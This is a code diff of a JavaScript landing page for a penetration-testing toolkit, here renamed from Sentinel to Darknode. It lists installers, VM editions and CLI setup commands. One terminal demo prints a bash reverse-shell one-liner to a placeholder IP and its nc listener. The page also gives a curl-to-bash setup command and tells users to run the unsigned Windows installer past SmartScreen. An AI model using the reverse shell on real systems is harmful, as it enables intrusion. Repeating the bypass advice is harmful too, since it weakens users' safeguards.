@@ -2,21 +2,21 @@
 // actions: { onGetStarted, onSignIn }
 
 // Installers are hosted on GitHub Releases (too large to commit to the repo).
-const REL = "https://github.com/SpartanKing18/sentinel-web/releases/download/sentinel";
+const REL = "https://github.com/SpartanKing18/darknode-web/releases/download/darknode";
 const APP_FILES = {
-  linux: REL + "/sentinel-app_2.40.0_amd64.deb",
-  appimage: REL + "/Sentinel-2.40.0.AppImage",
-  windows: REL + "/Sentinel.Setup.2.29.0.exe",
-  macos: REL + "/Sentinel-2.40.0-arm64.dmg",
-  macos_intel: REL + "/Sentinel-2.40.0.dmg",
+  linux: REL + "/darknode-app_2.40.0_amd64.deb",
+  appimage: REL + "/Darknode-2.40.0.AppImage",
+  windows: REL + "/Darknode.Setup.2.29.0.exe",
+  macos: REL + "/Darknode-2.40.0-arm64.dmg",
+  macos_intel: REL + "/Darknode-2.40.0.dmg",
 };
-// Sentinel OS VM editions: [name, size, description, build command]
+// Darknode OS VM editions: [name, size, description, build command]
 const OS_EDITIONS = [
   ["netinstall", "~12 GB", "Just a terminal — no desktop. Core CLI security stack + Nexus AI + local models. Boots to a console. Smallest.", "./build.sh debian netinstall &amp;&amp; ./launch.sh netinstall"],
   ["slim", "~20 GB", "Full XFCE desktop + Nexus + the CLI toolset — minus Metasploit, SecLists, Docker and the cockpit app.", "./build.sh debian slim &amp;&amp; ./export-vbox.sh slim"],
   ["full", "~30 GB", "The complete workstation: desktop, cockpit app, Metasploit, SecLists, Exploit-DB, Docker — 80+ tools.", "./build.sh debian full &amp;&amp; ./export-vbox.sh full"],
 ];
-const SITE = "https://sentinel-web-2hq9.onrender.com";
+const SITE = "https://darknode.ai";
 const EDITIONS = [
   ["Netinstall", "lightest · ~95 MB", "Just the app. Every tool auto-configures itself the first time you launch it — nothing pre-downloaded.", "Install the app above — done."],
   ["Slim", "recommended", "The app plus the essential toolset: recon, web, and password tools.", "curl -sL " + SITE + "/arsenal.sh | bash -s -- recon web passwords"],
@@ -42,25 +42,25 @@ export function renderLanding(view, actions) {
   const step = (n, t, d) => `<div class="step"><div class="step-n">${n}</div><div><h3>${t}</h3><p>${d}</p></div></div>`;
   const mod = (icon, t, d) => `<div class="mod-card"><div class="mod-ico">${svg(icon)}</div><div><div class="mod-t">${t}</div><div class="mod-d">${d}</div></div></div>`;
   const demoTerm = (title, body) => `<div class="term-window demo-term"><div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">${title}</span></div><pre class="tw-body">${body}</pre></div>`;
-  const P = '<span class="c-pl">sentinel@kali</span>:<span class="c-path">~</span>$ ';
+  const P = '<span class="c-pl">darknode@ai</span>:<span class="c-path">~</span>$ ';
   const DEMOS = [
-    ["sentinel — scan", `${P}sentinel scan 10.10.14.7
+    ["darknode — scan", `${P}darknode scan 10.10.14.7
 <span class="c-mut">PORT   SERVICE   BANNER</span>
 <span class="c-ok">22</span>     ssh       OpenSSH 9.6p1
 <span class="c-ok">80</span>     http      nginx 1.24.0
 <span class="c-ok">443</span>    https
 <span class="c-acc">[+]</span> 3 open ports found`],
-    ["sentinel — recon", `${P}sentinel dns github.com
+    ["darknode — recon", `${P}darknode dns github.com
 A     140.82.112.3
 MX    <span class="c-mut">aspmx.l.google.com</span>
 NS    dns1.p08.nsone.net
 TXT   v=spf1 include:_spf.google.com ~all`],
-    ["sentinel — cve", `${P}sentinel cve log4j
+    ["darknode — cve", `${P}darknode cve log4j
 <span class="c-acc">CVE-2021-44228</span> <span class="c-bad">[CRITICAL 10.0]</span>
 Apache Log4j2 JNDI features do not
 protect against attacker-controlled
 LDAP &mdash; the Log4Shell RCE.`],
-    ["sentinel — payload", `${P}sentinel revshell bash 10.0.0.1 4444
+    ["darknode — payload", `${P}darknode revshell bash 10.0.0.1 4444
 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 <span class="c-mut"># catch it with:</span>
 nc -lvnp 4444`],
@@ -98,8 +98,8 @@ nc -lvnp 4444`],
         </div>
         <div class="hero-visual">
           <div class="term-window">
-            <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">sentinel — recon</span></div>
-            <pre class="tw-body"><span class="tw-line" style="animation-delay:.15s"><span class="c-pl">sentinel@kali</span>:<span class="c-path">~</span>$ nmap -sV 10.10.14.7</span><span class="tw-line" style="animation-delay:.6s"><span class="c-mut">Starting Nmap 7.94 · scanning…</span></span><span class="tw-line" style="animation-delay:1s">PORT     STATE SERVICE   VERSION</span><span class="tw-line" style="animation-delay:1.2s">22/tcp   <span class="c-ok">open</span>  ssh       OpenSSH 8.2p1</span><span class="tw-line" style="animation-delay:1.45s">80/tcp   <span class="c-ok">open</span>  http      nginx 1.18.0</span><span class="tw-line" style="animation-delay:1.7s">443/tcp  <span class="c-ok">open</span>  ssl/http  nginx 1.18.0</span><span class="tw-line" style="animation-delay:2s"><span class="c-acc">[+]</span> 3 open ports · 2 services fingerprinted</span><span class="tw-line" style="animation-delay:2.3s"><span class="c-pl">sentinel@kali</span>:<span class="c-path">~</span>$ <span class="tw-cursor">▋</span></span></pre>
+            <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode — recon</span></div>
+            <pre class="tw-body"><span class="tw-line" style="animation-delay:.15s"><span class="c-pl">darknode@ai</span>:<span class="c-path">~</span>$ nmap -sV 10.10.14.7</span><span class="tw-line" style="animation-delay:.6s"><span class="c-mut">Starting Nmap 7.94 · scanning…</span></span><span class="tw-line" style="animation-delay:1s">PORT     STATE SERVICE   VERSION</span><span class="tw-line" style="animation-delay:1.2s">22/tcp   <span class="c-ok">open</span>  ssh       OpenSSH 8.2p1</span><span class="tw-line" style="animation-delay:1.45s">80/tcp   <span class="c-ok">open</span>  http      nginx 1.18.0</span><span class="tw-line" style="animation-delay:1.7s">443/tcp  <span class="c-ok">open</span>  ssl/http  nginx 1.18.0</span><span class="tw-line" style="animation-delay:2s"><span class="c-acc">[+]</span> 3 open ports · 2 services fingerprinted</span><span class="tw-line" style="animation-delay:2.3s"><span class="c-pl">darknode@ai</span>:<span class="c-path">~</span>$ <span class="tw-cursor">▋</span></span></pre>
           </div>
         </div>
       </div>
@@ -120,7 +120,7 @@ nc -lvnp 4444`],
           ${feature("code", "Code workbench", "The desktop app ships a real editor, file tree, run-code, and an integrated terminal.")}
           ${feature("bolt", "Payloads & handlers", "Generate reverse shells, listeners, and msfvenom payloads with live builders.")}
           ${feature("ai", "Autonomous agent", "The desktop app runs your local model in a think-act loop across 26 tools &mdash; files, shell, HTTP, recon, and git &mdash; with approval gating.")}
-          ${feature("shield", "Practice labs", "One-click Docker launch for DVWA, Juice Shop, WebGoat and more &mdash; then point Sentinel at them, or let the agent stand them up.")}
+          ${feature("shield", "Practice labs", "One-click Docker launch for DVWA, Juice Shop, WebGoat and more &mdash; then point Darknode at them, or let the agent stand them up.")}
         </div>
       </div>
     </section>
@@ -180,14 +180,14 @@ nc -lvnp 4444`],
         <h2 class="sec-title">Serious power for experienced operators</h2>
         <p class="muted dlapp-sub">Far more capable than the web &mdash; the native app runs tools with a live terminal, a full code workbench, and your local AI, right on your machine.</p>
         <div class="dlapp-grid">
-          ${osCard("Linux", ".deb installer", "linux", "sudo apt install ./Sentinel-linux.deb", "Debian / Ubuntu / Kali &mdash; recommended. Adds Sentinel to your app menu; launch it there or run <code>sentinel</code>.")}
-          ${osCard("Linux", "AppImage (portable)", "appimage", "chmod +x Sentinel-linux.AppImage &amp;&amp; ./Sentinel-linux.AppImage", "Any distro (Fedora / Arch / &hellip;). Needs FUSE: <code>sudo apt install libfuse2</code>, or run it with <code>--appimage-extract-and-run</code>.")}
-          ${osCard("Windows", ".exe installer", "windows", "Double-click Sentinel-windows.exe", "If SmartScreen warns, choose More info &rarr; Run anyway (the installer is unsigned).")}
-          ${osCard("macOS", ".dmg &middot; Apple Silicon", "macos", "open the .dmg, drag Sentinel to Applications", "Apple Silicon. Intel Mac: <a href=\"" + APP_FILES.macos_intel + "\" download>Intel .dmg</a>. Unsigned &mdash; first launch: right-click &rarr; Open.")}
+          ${osCard("Linux", ".deb installer", "linux", "sudo apt install ./Darknode-linux.deb", "Debian / Ubuntu / Kali &mdash; recommended. Adds Darknode to your app menu; launch it there or run <code>darknode</code>.")}
+          ${osCard("Linux", "AppImage (portable)", "appimage", "chmod +x Darknode-linux.AppImage &amp;&amp; ./Darknode-linux.AppImage", "Any distro (Fedora / Arch / &hellip;). Needs FUSE: <code>sudo apt install libfuse2</code>, or run it with <code>--appimage-extract-and-run</code>.")}
+          ${osCard("Windows", ".exe installer", "windows", "Double-click Darknode-windows.exe", "If SmartScreen warns, choose More info &rarr; Run anyway (the installer is unsigned).")}
+          ${osCard("macOS", ".dmg &middot; Apple Silicon", "macos", "open the .dmg, drag Darknode to Applications", "Apple Silicon. Intel Mac: <a href=\"" + APP_FILES.macos_intel + "\" download>Intel .dmg</a>. Unsigned &mdash; first launch: right-click &rarr; Open.")}
         </div>
 
         <div class="dlcli">
-          <h3 class="dlcli-h"><span class="mono grad-text">&gt;_</span> Or the whole OS &mdash; Sentinel OS security VM</h3>
+          <h3 class="dlcli-h"><span class="mono grad-text">&gt;_</span> Or the whole OS &mdash; Darknode OS security VM</h3>
           <p class="muted dlapp-sub">A self-provisioning Linux workstation &mdash; a Kali / BlackArch alternative. Pick an edition; each boots in VirtualBox or QEMU/KVM and self-configures on first launch.</p>
           <div class="os-editions">
             ${OS_EDITIONS.map((e) => `<div class="os-ed${e[0] === "full" ? " os-ed-full" : ""}">
@@ -195,7 +195,7 @@ nc -lvnp 4444`],
               <p class="muted os-ed-d">${e[2]}</p>
               <code class="ed-cmd">${e[3]}</code></div>`).join("")}
           </div>
-          <p class="muted" style="font-size:.78rem;margin-top:10px">First <code>git clone https://github.com/SpartanKing18/sentinel-os &amp;&amp; cd sentinel-os</code>, then run the command. <a href="https://github.com/SpartanKing18/sentinel-os" target="_blank" rel="noopener">Sentinel OS on GitHub &rarr;</a></p>
+          <p class="muted" style="font-size:.78rem;margin-top:10px">First <code>git clone https://github.com/SpartanKing18/darknode-os &amp;&amp; cd darknode-os</code>, then run the command. <a href="https://github.com/SpartanKing18/darknode-os" target="_blank" rel="noopener">Darknode OS on GitHub &rarr;</a></p>
         </div>
 
         <h3 class="dlcli-h" style="margin-top:26px">Pick a setup edition</h3>
@@ -209,13 +209,13 @@ nc -lvnp 4444`],
             <div class="ed-card">
               <div class="ed-head"><h3>git clone</h3><span class="chip">tiny · ~300 KB</span></div>
               <p class="muted" style="font-size:.83rem;margin:6px 0 8px">Clone the source and run it with Node &mdash; no 50&nbsp;MB binary on disk, and <code>git pull</code> keeps it current. Best if you have Node 18+.</p>
-              <code class="ed-cmd">git clone https://github.com/SpartanKing18/sentinel-cli &amp;&amp; cd sentinel-cli &amp;&amp; node sentinel.js</code>
+              <code class="ed-cmd">git clone https://github.com/SpartanKing18/darknode-cli &amp;&amp; cd darknode-cli &amp;&amp; node darknode.js</code>
             </div>
             <div class="ed-card">
               <div class="ed-head"><h3>Download the binary</h3><span class="chip">standalone · ~52 MB</span></div>
               <p class="muted" style="font-size:.83rem;margin:6px 0 8px">A self-contained executable with Node bundled in &mdash; no Node needed, runs on its own. Uses more disk.</p>
-              <code class="ed-cmd">curl -L ${REL}/Sentinel-cli-linux -o sentinel &amp;&amp; chmod +x sentinel &amp;&amp; ./sentinel</code>
-              <div class="muted" style="font-size:.78rem;margin-top:6px">Windows:<code class="ed-cmd" style="margin-top:4px">curl.exe -L ${REL}/Sentinel-cli-windows.exe -o sentinel.exe; .\\sentinel.exe</code></div>
+              <code class="ed-cmd">curl -L ${REL}/Darknode-cli-linux -o darknode &amp;&amp; chmod +x darknode &amp;&amp; ./darknode</code>
+              <div class="muted" style="font-size:.78rem;margin-top:6px">Windows:<code class="ed-cmd" style="margin-top:4px">curl.exe -L ${REL}/Darknode-cli-windows.exe -o darknode.exe; .\\darknode.exe</code></div>
             </div>
           </div>
           <p class="muted" style="font-size:.78rem;margin-top:10px"><strong>Which?</strong> <b>git clone</b> is smallest and self-updating but needs Node installed. The <b>binary</b> is bigger but works with nothing else installed. Both are the same tool.</p>
@@ -223,21 +223,21 @@ nc -lvnp 4444`],
 
         <div class="dlcli">
           <h3 class="dlcli-h"><span class="mono grad-text">&gt;_</span> The coding CLI &mdash; meet Nexus</h3>
-          <p class="muted dlapp-sub">The same binary is also <b>Nexus</b>, an AI coding agent for your terminal (think Claude Code): it reads and edits your files and runs commands using cloud or free local models &mdash; private, nothing leaves your box. Download it, then run <code>sentinel nexus --tui</code>.</p>
+          <p class="muted dlapp-sub">The same binary is also <b>Nexus</b>, an AI coding agent for your terminal (think Claude Code): it reads and edits your files and runs commands using cloud or free local models &mdash; private, nothing leaves your box. Download it, then run <code>darknode nexus --tui</code>.</p>
           <div class="ed-grid">
             <div class="ed-card">
               <div class="ed-head"><h3>Download &amp; code</h3><span class="chip">standalone · ~52 MB</span></div>
               <p class="muted" style="font-size:.83rem;margin:6px 0 10px">Self-contained binary &mdash; Node bundled in, nothing else to install. Grab it and launch the agent.</p>
               <div class="dlcli-btns">
-                <a class="btn" href="${REL}/Sentinel-cli-linux" download>Download &middot; Linux</a>
-                <a class="btn ghost" href="${REL}/Sentinel-cli-windows.exe" download>Download &middot; Windows</a>
+                <a class="btn" href="${REL}/Darknode-cli-linux" download>Download &middot; Linux</a>
+                <a class="btn ghost" href="${REL}/Darknode-cli-windows.exe" download>Download &middot; Windows</a>
               </div>
-              <code class="ed-cmd" style="margin-top:8px">sentinel nexus --tui</code>
+              <code class="ed-cmd" style="margin-top:8px">darknode nexus --tui</code>
             </div>
             <div class="ed-card">
               <div class="ed-head"><h3>Run from source</h3><span class="chip">tiny · ~300 KB</span></div>
               <p class="muted" style="font-size:.83rem;margin:6px 0 10px">Have Node 18+? Clone and start the coder straight from source &mdash; <code>git pull</code> keeps it current.</p>
-              <code class="ed-cmd">git clone https://github.com/SpartanKing18/sentinel-cli &amp;&amp; cd sentinel-cli &amp;&amp; node sentinel.js nexus --tui</code>
+              <code class="ed-cmd">git clone https://github.com/SpartanKing18/darknode-cli &amp;&amp; cd darknode-cli &amp;&amp; node darknode.js nexus --tui</code>
             </div>
           </div>
           <p class="muted" style="font-size:.78rem;margin-top:10px">Cloud engines (Claude, GPT, Gemini) or free local models via Ollama &mdash; your choice, switchable per run.</p>
@@ -258,7 +258,7 @@ nc -lvnp 4444`],
 
     <footer class="site-foot">
       <div class="wrap foot-inner">
-        <span class="brand">Sentinel</span>
+        <span class="brand">Darknode</span>
         <span class="muted">Your security workspace.</span>
         <span class="foot-owner muted">Owner &middot; <a href="mailto:cashzombs@gmail.com">cashzombs@gmail.com</a></span>
         <nav class="foot-links">
